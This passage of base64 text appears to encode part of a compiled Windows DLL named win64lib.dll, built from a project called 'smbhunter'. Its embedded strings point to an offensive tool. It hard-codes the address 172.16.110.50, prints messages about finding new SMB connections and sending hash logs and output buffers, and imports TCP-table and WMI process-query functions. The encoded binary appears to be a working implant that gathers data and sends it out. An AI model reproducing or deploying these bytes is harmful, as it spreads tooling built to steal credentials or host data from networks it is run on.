agyLhVj9//9Q6DXv//+DxAjDjY1Y/f//6Ti9//9qDIuFfP3//1DoGO///4PECMONjXz9///pG73//42NoPz//+lww///i4
Vg/f//g+ABD4QSAAAAg6Vg/f///ouNVP3//+lPrv//w42NkP3//+lDrv//jY2o/f//6Tiu//+NjcD9///pLa7//4tUJAiN
QgyLivD7//8zyOhe7v//i0r4M8joVO7//7jggQAQ6TP8///MzMzMzI2NuP7//+n1wv//i4Vw////g+ABD4QSAAAAg6Vw//
///ouNaP///+m00P//w41N2OnLrf//jU2Q6cOt//+NTcDpu63//41NqOmzrf//i1QkCI1CDIuKtP7//zPI6OTt//+LSvwz
yOja7f//uFiCABDpufv//8zMzMzMzMzMzMzMjU3U6Xit//+NjdD+///pTdD//41NvOllrf//jY0Y/v//6VrC//+NTaTpUq
3//4tUJAiNQgyLihj+//8zyOiD7f//i0r4M8joee3//7isggAQ6Vj7///MzMzMzMzMzMzMjU0I6Rit//+NjSD////pDcL/
/41N2OkFrf//i1QkCI1CDIuKHP///zPI6Dbt//+LSvwzyOgs7f//uPiCABDpC/v//8zMzMzMzMzMzMzMzMyLRfCD4AEPhB
AAAACDZfD+i03sg8Fo/yWQcAAQw4tN7IPBIP8lyHAAEItN6P8lmHAAEItUJAiNQgyLSugzyOjS7P//uDSDABDpsfr//8zM
zItd8I1LCOl1rP//jU2g6W2s//+NTYjpZaz//4tUJAiNQgyLSoAzyOiZ7P//i0r4M8joj+z//7hwgwAQ6W76//+LVCQIjU
IMi0r0M8jodOz//7h0fwAQ6VP6///MzMzMzOjLpf//gz1wpgAQEHJUiw1cpgAQUeiGtv//oXCmABBAPQAQAAByMvbBH3QG
/yV4cQAQi0H8O8FyBv8leHEAECvIg/kEcwb/JXhxABCD+SN2Bv8leHEAEIvIUehK7P//g8QExwVspgAQAAAAAMcFcKYAEA
8AAADGBVymABAA6U6l//+57KIAEOl06P//zMzMzGgIoAAQ/xX0cAAQwwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAASJEAAAAAAAAsiAAAOIgAAESIAABWiAAAbpUAAF
KVAAA4lQAADJUAAPKUAADelAAAwpQAAK6UAACalAAAPpQAAFSUAABglAAAfJQAACKVAAAulAAAAAAAANCJAAAKigAAUIoA
AJKKAADSigAAEIsAAFKLAACSiwAA4osAALyJAAAijAAAOIwAAHSMAACqjAAAFI0AAEqNAACGjQAAwo0AAAKOAABEjgAAiI
4AAMiOAAAOjwAAVI8AAJ6PAADcjwAAKJAAAICQAADAkAAA+pAAAK6JAACOiQAAbokAAFSJAAAyiQAA9ogAAAAAAAAGAACA
AgAAgAkAAIAAAAAAcpEAAJKRAACkkQAAvpEAANaRAADskQAA9pEAABCSAACIkQAAhJUAAAAAAAADAACAcwAAgAsAAIATAA
CAFwAAgHQAAIAMAACADwAAgG8AAIAJAACAEAAAgAQAAIAAAAAAhJIAAJSSAAAAAAAAnJIAAKSSAACukgAAAAAAAEKSAABY
kwAACJMAAOaSAADMkgAAupIAACSTAAB8kwAAcJMAAGaTAABAkwAAAAAAAGiSAAAAAAAAjJIAAAAAAAB6iAAAtIgAAMyIAA
CgiAAAjIgAAAAAAABgEAAQAAAAAD0QABBQEAAQABAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAVgAQyHcAEFFX
ABAAAAAAGKMAEGijABCseAAQcCQAEGAkABAQeAAQyV8AEGAkABBiYWQgYWxsb2NhdGlvbgAAXHgAEMlfABBgJAAQYmFkIG
FycmF5IG5ldyBsZW5ndGgAAAAAEfiQRTod0BGJHwCqAEsuJIemEtx/c88RiE0AqgBLLiQxNzIuMTYuMTEwLjUwAAAAWytd
IEJ1ZmYgU3RyIHNpemU6IABbK10gSGFzaGxvZyBzaXplOiAAAFsrXSBPdXRwdXQgaGFzaDogAAAAWy1dIENvbm5lY3Rpb2
4gRmFpbGVkLi4uAAAAAFsqXSBOZXcgU01CIGNvbm5lY3Rpb24gZm91bmQuICBTZW5kaW5nLi4uAAAAWytdIFNlbnQgb3V0
cHV0LgAAAABbKl0gQXR0ZW1wdGluZyB0byBzZW5kIGJ1ZmZlci4uLgAAAABzdHJpbmcgdG9vIGxvbmcAaW52YWxpZCBzdH
JpbmcgcG9zaXRpb24AdmVjdG9yPFQ+IHRvbyBsb25nAABVbmtub3duIGV4Y2VwdGlvbgAAAEMAbwBtAG0AYQBuAGQATABp
AG4AZQAAAEgAYQBuAGQAbABlAAAAAAAsAAAARmFpbGVkIHRvIGluaXRpYWxpemUgQ09NIGxpYnJhcnkuIEVycm9yIGNvZG
UgPSAweAAAAEZhaWxlZCB0byBpbml0aWFsaXplIHNlY3VyaXR5LiBFcnJvciBjb2RlID0gMHgAACBFcnIgY29kZSA9IDB4
AABGYWlsZWQgdG8gY3JlYXRlIElXYmVtTG9jYXRvciBvYmplY3QuAAAAUgBPAE8AVABcAEMASQBNAFYAMgAAAAAAQ291bG
Qgbm90IGNvbm5lY3QuIEVycm9yIGNvZGUgPSAweAAAQ291bGQgbm90IHNldCBwcm94eSBibGFua2V0LiBFcnJvciBjb2Rl
ID0gMHgAAAAAIEVycm9yIGNvZGUgPSAweAAAAABRdWVyeSBmb3Igb3BlcmF0aW5nIHN5c3RlbSBuYW1lIGZhaWxlZC4AU0
VMRUNUICogRlJPTSBXaW4zMl9Qcm9jZXNzAFdRTABDAHIAZQBhAHQAaQBvAG4ARABhAHQAZQAAAAAATm9uZQAAAABOAGEA
bQBlAAAAAABFcnJvciBhbGxvY2F0aW5nIG1lbW9yeQoAAAAAMC4wLjAuMAA6AAAAT3V0cHV0OiAKAAAAAAAAAFgAAADAeg
AQMEkAELhTABC+UwAQ8EYAEJBGABDEUwAQMEYAEMpTABDQUwAQ1lMAEGBEABAwQwAQ3FMAEOJTABDoUwAQ1HoAEE1OABAA
AAAAaAAAAFshXSBGYWlsZWQgYXQgc29ja2V0AAAAAFshXSBDb3VsZG4ndCBjb25uZWN0AAAAAFsrXSBDb25uZWN0ZWQuAA
BlbmQAWypdIFNlbmRpbmcgYnVmZmVyLi4AAAAAWyFdIFVuYWJsZSB0byBjb25uZWN0AAAAMTAAAFshXUNvbm5lY3Rpb24g
dGltZWQgb3V0LgAAAABbK10gUmVtb3RlIHRlcm1pbmF0ZWQgY29ubmVjdGlvbiBzdWNjZXNzZnVsbHkuIABbK10gQnl0ZX
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
AAAiBZMZCAAAAKCBABAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAA/////4BnABAAAAAAi2cAEAAAAACTZwAQAAAAAJ
tnABAAAAAAo2cAEAAAAACrZwAQAAAAALNnABAAAAAAu2cAECIFkxkKAAAACIIAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA
AAAAAAD/////QGgAEAAAAADwZwAQAQAAAPtnABABAAAADWgAEAMAAAAYaAAQAwAAACpoABABAAAANWgAEAYAAABiaAAQBw
AAAG1oABAIAAAAeGgAECIFkxkGAAAAfIIAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAP////+7aAAQAAAAALBoABABAAAA
3WgAEAIAAADlaAAQAwAAAO1oABAEAAAA9WgAECIFkxkFAAAA0IIAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAP////8waQ
AQAAAAADhpABABAAAAQ2kAEAIAAABLaQAQAwAAAFZpABAiBZMZAwAAAByDABAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAD/
////kGkAEAAAAACYaQAQAQAAAKNpABAiBZMZAwAAAFiDABAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAD/////4GkAEAAAAA
D9aQAQAQAAAAlqABAiBZMZAwAAAJSDABAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAD/////MGoAEAAAAAA7agAQAQAAAENq
ABAAAAAA5P///wAAAADI////AAAAAP7////wVAAQ9lQAEAAAAABAVgAQAAAAANyDABABAAAA5IMAEAAAAABQoAAQAAAAAP
////8AAAAAEAAAALBVABD+////AAAAANj///8AAAAA/v////1ZABAQWgAQAAAAAP7///8AAAAA0P///wAAAAD+////AAAA
APdbABAAAAAA/v///wAAAADU////AAAAAP7///8AAAAAfFwAEAAAAAD+////AAAAANT///8AAAAA/v///1FdABBwXQAQAA
AAALhfABAAAAAAjIQAEAIAAACYhAAQ8IQAEBAAAACEoAAQAAAAAP////8AAAAADAAAAFJfABAAAAAAuF8AEAAAAADEhAAQ
AwAAANSEABCYhAAQ8IQAEAAAAACgoAAQAAAAAP////8AAAAADAAAAIVfABAAAAAAyKAAEAAAAAD/////AAAAAAwAAAAwJA
AQAAAAAAAAAACu2H9bAAAAAEKFAAABAAAAAQAAAAEAAAA4hQAAPIUAAECFAABwEAAAT4UAAAAAd2luNjRsaWIuZGxsAFZv
aWRGdW5jAGSGAAAAAAAAAAAAAGyIAAAIcAAAFIgAAAAAAAAAAAAA3ogAALhxAABIhwAAAAAAAAAAAADoiAAA7HAAALSGAA
AAAAAAAAAAADqRAABYcAAAXIYAAAAAAAAAAAAAWJEAAABwAACEhwAAAAAAAAAAAABmkQAAKHEAAFiHAAAAAAAAAAAAADCS
AAD8cAAA1IcAAAAAAAAAAAAAipMAAHhxAAAEiAAAAAAAAAAAAACskwAAqHEAALiHAAAAAAAAAAAAAMyTAABccQAADIgAAA
AAAAAAAAAA7pMAALBxAADEhwAAAAAAAAAAAAAOlAAAaHEAAAAAAAAAAAAAAAAAAAAAAAAAAAAASJEAAAAAAAAsiAAAOIgA
AESIAABWiAAAbpUAAFKVAAA4lQAADJUAAPKUAADelAAAwpQAAK6UAACalAAAPpQAAFSUAABglAAAfJQAACKVAAAulAAAAA
AAANCJAAAKigAAUIoAAJKKAADSigAAEIsAAFKLAACSiwAA4osAALyJAAAijAAAOIwAAHSMAACqjAAAFI0AAEqNAACGjQAA
wo0AAAKOAABEjgAAiI4AAMiOAAAOjwAAVI8AAJ6PAADcjwAAKJAAAICQAADAkAAA+pAAAK6JAACOiQAAbokAAFSJAAAyiQ
AA9ogAAAAAAAAGAACAAgAAgAkAAIAAAAAAcpEAAJKRAACkkQAAvpEAANaRAADskQAA9pEAABCSAACIkQAAhJUAAAAAAAAD
AACAcwAAgAsAAIATAACAFwAAgHQAAIAMAACADwAAgG8AAIAJAACAEAAAgAQAAIAAAAAAhJIAAJSSAAAAAAAAnJIAAKSSAA
CukgAAAAAAAEKSAABYkwAACJMAAOaSAADMkgAAupIAACSTAAB8kwAAcJMAAGaTAABAkwAAAAAAAGiSAAAAAAAAjJIAAAAA
AAB6iAAAtIgAAMyIAACgiAAAjIgAAAAAAABBA0hlYXBGcmVlAAA9A0hlYXBBbGxvYwCtAkdldFByb2Nlc3NIZWFwAADxBV
dpZGVDaGFyVG9NdWx0aUJ5dGUAS0VSTkVMMzIuZGxsAACNAENvVW5pbml0aWFsaXplAAAoAENvQ3JlYXRlSW5zdGFuY2UA
AIQAQ29TZXRQcm94eUJsYW5rZXQAXwBDb0luaXRpYWxpemVTZWN1cml0eQAAXgBDb0luaXRpYWxpemVFeAAAb2xlMzIuZG
xsAE9MRUFVVDMyLmRsbAAAtAI/Y291dEBzdGRAQDNWPyRiYXNpY19vc3RyZWFtQERVPyRjaGFyX3RyYWl0c0BEQHN0ZEBA
QDFAQQAAHgU/dW5jYXVnaHRfZXhjZXB0aW9uQHN0ZEBAWUFfTlhaAIsCP19YYmFkX2FsbG9jQHN0ZEBAWUFYWFoAjwI/X1
hvdXRfb2ZfcmFuZ2VAc3RkQEBZQVhQQkRAWgCOAj9fWGxlbmd0aF9lcnJvckBzdGRAQFlBWFBCREBaALYFX1RocmRfc2xl
ZXAAzAVfWHRpbWVfZ2V0X3RpY2tzAAA0BT93aWRlbkA/JGJhc2ljX2lvc0BEVT8kY2hhcl90cmFpdHNAREBzdGRAQEBzdG
RAQFFCRUREQFoA4QQ/c3B1dG5APyRiYXNpY19zdHJlYW1idWZARFU/JGNoYXJfdHJhaXRzQERAc3RkQEBAc3RkQEBRQUVf
SlBCRF9KQFoAAGEEP3B1dEA/JGJhc2ljX29zdHJlYW1ARFU/JGNoYXJfdHJhaXRzQERAc3RkQEBAc3RkQEBRQUVBQVYxMk
BEQFoAAN4EP3NwdXRjQD8kYmFzaWNfc3RyZWFtYnVmQERVPyRjaGFyX3RyYWl0c0BEQHN0ZEBAQHN0ZEBAUUFFSERAWgBE
Aj9fT3NmeEA/JGJhc2ljX29zdHJlYW1ARFU/JGNoYXJfdHJhaXRzQERAc3RkQEBAc3RkQEBRQUVYWFoAAGgDP2ZsdXNoQD
8kYmFzaWNfb3N0cmVhbUBEVT8kY2hhcl90cmFpdHNAREBzdGRAQEBzdGRAQFFBRUFBVjEyQFhaAMUEP3NldHN0YXRlQD8k
YmFzaWNfaW9zQERVPyRjaGFyX3RyYWl0c0BEQHN0ZEBAQHN0ZEBAUUFFWEhfTkBaAAAGAT8/Nj8kYmFzaWNfb3N0cmVhbU
BEVT8kY2hhcl90cmFpdHNAREBzdGRAQEBzdGRAQFFBRUFBVjAxQFA2QUFBVjAxQEFBVjAxQEBaQFoAAAABPz82PyRiYXNp
Y19vc3RyZWFtQERVPyRjaGFyX3RyYWl0c0BEQHN0ZEBAQHN0ZEBAUUFFQUFWMDFASUBaAACWAT9fQkFET0ZGQHN0ZEBAM1
9KQgAALwA/PzA/JGJhc2ljX3N0cmVhbWJ1ZkBEVT8kY2hhcl90cmFpdHNAREBzdGRAQEBzdGRAQElBRUBYWgAADAA/PzA/
JGJhc2ljX2lvc0BEVT8kY2hhcl90cmFpdHNAREBzdGRAQEBzdGRAQElBRUBYWgAAEwA/PzA/JGJhc2ljX2lvc3RyZWFtQE
RVPyRjaGFyX3RyYWl0c0BEQHN0ZEBAQHN0ZEBAUUFFQFBBVj8kYmFzaWNfc3RyZWFtYnVmQERVPyRjaGFyX3RyYWl0c0BE
QHN0ZEBAQDFAQFoAAH0APz8xPyRiYXNpY19pb3NARFU/JGNoYXJfdHJhaXRzQERAc3RkQEBAc3RkQEBVQUVAWFoAAKYCP2
NsZWFyQD8kYmFzaWNfaW9zQERVPyRjaGFyX3RyYWl0c0BEQHN0ZEBAQHN0ZEBAUUFFWEhfTkBaAIkAPz8xPyRiYXNpY19z
dHJlYW1idWZARFU/JGNoYXJfdHJhaXRzQERAc3RkQEBAc3RkQEBVQUVAWFoAACgCP19Mb2NrQD8kYmFzaWNfc3RyZWFtYn
VmQERVPyRjaGFyX3RyYWl0c0BEQHN0ZEBAQHN0ZEBAVUFFWFhaAAB/Aj9fVW5sb2NrQD8kYmFzaWNfc3RyZWFtYnVmQERV
PyRjaGFyX3RyYWl0c0BEQHN0ZEBAQHN0ZEBAVUFFWFhaAADVBD9zaG93bWFueWNAPyRiYXNpY19zdHJlYW1idWZARFU/JG
NoYXJfdHJhaXRzQERAc3RkQEBAc3RkQEBNQUVfSlhaABsFP3VmbG93QD8kYmFzaWNfc3RyZWFtYnVmQERVPyRjaGFyX3Ry
YWl0c0BEQHN0ZEBAQHN0ZEBATUFFSFhaAABDBT94c2dldG5APyRiYXNpY19zdHJlYW1idWZARFU/JGNoYXJfdHJhaXRzQE
RAc3RkQEBAc3RkQEBNQUVfSlBBRF9KQFoARgU/eHNwdXRuQD8kYmFzaWNfc3RyZWFtYnVmQERVPyRjaGFyX3RyYWl0c0BE
QHN0ZEBAQHN0ZEBATUFFX0pQQkRfSkBaALUEP3NldGJ1ZkA/JGJhc2ljX3N0cmVhbWJ1ZkBEVT8kY2hhcl90cmFpdHNARE
BzdGRAQEBzdGRAQE1BRVBBVjEyQFBBRF9KQFoA/QQ/c3luY0A/JGJhc2ljX3N0cmVhbWJ1ZkBEVT8kY2hhcl90cmFpdHNA
REBzdGRAQEBzdGRAQE1BRUhYWgD2Az9pbWJ1ZUA/JGJhc2ljX3N0cmVhbWJ1ZkBEVT8kY2hhcl90cmFpdHNAREBzdGRAQE
BzdGRAQE1BRVhBQlZsb2NhbGVAMkBAWgAACAE/PzY/JGJhc2ljX29zdHJlYW1ARFU/JGNoYXJfdHJhaXRzQERAc3RkQEBA
c3RkQEBRQUVBQVYwMUBQNkFBQVZpb3NfYmFzZUAxQEFBVjIxQEBaQFoAAAEBPz82PyRiYXNpY19vc3RyZWFtQERVPyRjaG
FyX3RyYWl0c0BEQHN0ZEBAQHN0ZEBAUUFFQUFWMDFASkBaAACAAD8/MT8kYmFzaWNfaW9zdHJlYW1ARFU/JGNoYXJfdHJh
aXRzQERAc3RkQEBAc3RkQEBVQUVAWFoA/wA/PzY/JGJhc2ljX29zdHJlYW1ARFU/JGNoYXJfdHJhaXRzQERAc3RkQEBAc3
RkQEBRQUVBQVYwMUBIQFoAAE1TVkNQMTQwLmRsbAAAfwBHZXRUY3BUYWJsZTIAAElQSExQQVBJLkRMTAAAV1MyXzMyLmRs
bAAAEABfX0N4eEZyYW1lSGFuZGxlcjMAAEcAbWVtbW92ZQAjAF9fc3RkX3Rlcm1pbmF0ZQAiAF9fc3RkX2V4Y2VwdGlvbl
9kZXN0cm95ACEAX19zdGRfZXhjZXB0aW9uX2NvcHkAAAEAX0N4eFRocm93RXhjZXB0aW9uAABIAG1lbXNldAAANQBfZXhj
ZXB0X2hhbmRsZXI0X2NvbW1vbgAlAF9fc3RkX3R5cGVfaW5mb19kZXN0cm95X2xpc3QAAFZDUlVOVElNRTE0MC5kbGwAAD
sAX2ludmFsaWRfcGFyYW1ldGVyX25vaW5mb19ub3JldHVybgAADwBfX3N0ZGlvX2NvbW1vbl92c3ByaW50Zl9zABkAX2l0
b3cARQBjbG9jawBPAGF0b2YAABgAZnJlZQAAGQBtYWxsb2MAAAgAX2NhbGxuZXdoAEEAX3NlaF9maWx0ZXJfZGxsABkAX2
NvbmZpZ3VyZV9uYXJyb3dfYXJndgAANQBfaW5pdGlhbGl6ZV9uYXJyb3dfZW52aXJvbm1lbnQAADYAX2luaXRpYWxpemVf
b25leGl0X3RhYmxlAAA+AF9yZWdpc3Rlcl9vbmV4aXRfZnVuY3Rpb24AJABfZXhlY3V0ZV9vbmV4aXRfdGFibGUAHwBfY3
J0X2F0ZXhpdAAXAF9jZXhpdAAAOABfaW5pdHRlcm0AOQBfaW5pdHRlcm1fZQBhcGktbXMtd2luLWNydC1ydW50aW1lLWwx
LTEtMC5kbGwAYXBpLW1zLXdpbi1jcnQtc3RkaW8tbDEtMS0wLmRsbABhcGktbXMtd2luLWNydC1jb252ZXJ0LWwxLTEtMC
5kbGwAYXBpLW1zLXdpbi1jcnQtdGltZS1sMS0xLTAuZGxsAABhcGktbXMtd2luLWNydC1oZWFwLWwxLTEtMC5kbGwAAFoC
R2V0TGFzdEVycm9yAADiA011bHRpQnl0ZVRvV2lkZUNoYXIAwwNMb2NhbEZyZWUAnQVVbmhhbmRsZWRFeGNlcHRpb25GaW
x0ZXIAAF4FU2V0VW5oYW5kbGVkRXhjZXB0aW9uRmlsdGVyABMCR2V0Q3VycmVudFByb2Nlc3MAfAVUZXJtaW5hdGVQcm9j
ZXNzAAB9A0lzUHJvY2Vzc29yRmVhdHVyZVByZXNlbnQAdgNJc0RlYnVnZ2VyUHJlc2VudABABFF1ZXJ5UGVyZm9ybWFuY2
VDb3VudGVyABQCR2V0Q3VycmVudFByb2Nlc3NJZAAYAkdldEN1cnJlbnRUaHJlYWRJZAAA4gJHZXRTeXN0ZW1UaW1lQXNG
aWxlVGltZQAbAURpc2FibGVUaHJlYWRMaWJyYXJ5Q2FsbHMAWgNJbml0aWFsaXplU0xpc3RIZWFkAEYAbWVtY3B5AAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADQVgAQAAAAAAoAAAAAAAAABAACgAAAAAD/////sR
m/RE7mQLsAAAAAAAAAAAAAAAB1mAAAAQAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAhyABAAAAAALj9BVl9jb21fZXJy
b3JAQAAAAAAIcgAQAAAAAC4/QVZ0eXBlX2luZm9AQAAIcgAQAAAAAC4/QVZiYWRfYWxsb2NAc3RkQEAACHIAEAAAAAAuP0
FWYmFkX2FycmF5X25ld19sZW5ndGhAc3RkQEAAAAhyABAAAAAALj9BVmV4Y2VwdGlvbkBzdGRAQAAAAAAACHIAEAAAAAAu
P0FWPyRiYXNpY19zdHJpbmdzdHJlYW1ARFU/JGNoYXJfdHJhaXRzQERAc3RkQEBWPyRhbGxvY2F0b3JAREAyQEBzdGRAQA
AIcgAQAAAAAC4/QVY/JGJhc2ljX3N0cmluZ2J1ZkBEVT8kY2hhcl90cmFpdHNAREBzdGRAQFY/JGFsbG9jYXRvckBEQDJA
QHN0ZEBAAAAAAAhyABAAAAAALj9BVmlvc19iYXNlQHN0ZEBAAAAIcgAQAAAAAC4/QVY/JGJhc2ljX2lvc3RyZWFtQERVPy
RjaGFyX3RyYWl0c0BEQHN0ZEBAQHN0ZEBAAAAIcgAQAAAAAC4/QVY/JF9Jb3NiQEhAc3RkQEAACHIAEAAAAAAuP0FWPyRi
YXNpY19zdHJlYW1idWZARFU/JGNoYXJfdHJhaXRzQERAc3RkQEBAc3RkQEAACHIAEAAAAAAuP0FWPyRiYXNpY19pc3RyZW
FtQERVPyRjaGFyX3RyYWl0c0BEQHN0ZEBAQHN0ZEBAAAAACHIAEAAAAAAuP0FWPyRiYXNpY19pb3NARFU/JGNoYXJfdHJh
aXRzQERAc3RkQEBAc3RkQEAAAAAIcgAQAAAAAC4/QVY/JGJhc2ljX29zdHJlYW1ARFU/JGNoYXJfdHJhaXRzQERAc3RkQE
BAc3RkQEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
